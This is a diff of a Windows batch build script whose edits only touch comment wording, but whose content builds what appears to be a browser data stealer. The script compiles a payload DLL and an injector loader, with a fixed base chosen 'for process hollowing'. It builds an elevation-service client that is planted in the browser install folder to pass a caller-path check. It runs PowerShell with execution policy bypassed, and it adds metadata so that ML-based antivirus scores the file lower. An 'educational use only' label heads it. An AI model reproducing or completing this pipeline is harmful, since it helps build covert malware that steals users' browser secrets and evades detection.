@@ -1,8 +1,8 @@
 @echo off
 setlocal EnableExtensions
-REM build.bat - compiles ckdll.dll (payload) and loader.exe (injector)
+REM build.bat -- compiles ckdll.dll (payload) and loader.exe (injector)
 REM EDUCATIONAL USE ONLY - FOR SECURITY RESEARCH AND TRAINING
-REM Requires: Visual Studio 2022 Build Tools with "Desktop development with C++"
+REM Requires: Visual Studio 2022 Build Tools with "Desktop development with C++".
 REM
 REM Output:
 REM   bin\ckdll.dll  - payload DLL (CRT-less)
@@ -94,8 +94,8 @@ if /i "%~1"=="proxy" goto :proxy_msvc
 
 if not exist bin mkdir bin
 
-REM stale .exp/.lib from a previous build poison the new export table
-REM (GetProcAddress would return an old RVA) -- always delete before linking
+REM Stale .exp/.lib from a previous build poison the new export table
+REM (GetProcAddress would return an old RVA) -- always delete before linking.
 del /q bin\ckdll.exp bin\ckdll.lib 2>nul
 
 REM --- payload DLL (CRT-less, no optimization) ---
@@ -104,7 +104,7 @@ REM /NODEFAULTLIB /ENTRY:payload_entry: no CRT runtime
 REM /DYNAMICBASE:NO /BASE:0x5F000000: fixed base for process hollowing
 REM /DDEBUG: debug builds ONLY - writes C:\ProgramData\MediaCache\cache.log on the target
 REM /Gs4096: every frame >= 4KB gets a stack probe (our chkstk.asm)
-REM /utf-8: sources contain UTF-8 comments; without it MSVC assumes the ANSI codepage
+REM /utf-8: sources contain UTF-8 comments; without it MSVC assumes the ANSI codepage.
 echo [build] ckdll.dll ...
 ml64 /c /nologo /Fo bin\chkstk.obj src\chkstk.asm
 if errorlevel 1 ( echo [build] ML64 FAILED & exit /b 1 )
@@ -114,7 +114,7 @@ cl /nologo /LD /Od /Oi- /GS- /Gs4096 /utf-8 src\ckdll.cpp bin\chkstk.obj /Fe:bin
          /GUARD:NO /MACHINE:X64 kernel32.lib crypt32.lib bcrypt.lib iphlpapi.lib secur32.lib
 if errorlevel 1 ( echo [build] DLL BUILD FAILED & exit /b 1 )
 
-REM --- elevation-service client (v20). Built BEFORE the loader resource: the
+REM --- Elevation-service client (v20). Built BEFORE the loader resource: the
 REM     loader embeds it as RCDATA and deploys it into the browser install tree
 REM     at runtime, because the service validates the caller path. ---
 echo [build] ckdec.exe ...
@@ -122,12 +122,12 @@ cl /nologo /O2 /MT /std:c++17 /utf-8 src\ckdec.cpp /Fe:bin\ckdec.exe ^
    /link /SUBSYSTEM:CONSOLE ole32.lib oleaut32.lib crypt32.lib
 if errorlevel 1 ( echo [build] CKDEC BUILD FAILED & exit /b 1 )
 
-REM --- generate payload.h (byte array of the DLL embedded in loader.exe) ---
+REM --- Generate payload.h (byte array of the DLL embedded in loader.exe) ---
 echo [build] payload.h ...
 powershell -nop -exec bypass -file src\gen.ps1
 if errorlevel 1 ( echo [build] GEN FAILED & exit /b 1 )
 
-REM --- version resource (an unsigned GUI exe with no metadata scores high in ML) ---
+REM --- Version resource (an unsigned GUI exe with no metadata scores high in ML) ---
 echo [build] loader.exe ...
 rc /nologo /fo bin\loader.res src\loader.rc
 if errorlevel 1 ( echo [build] RC FAILED & exit /b 1 )
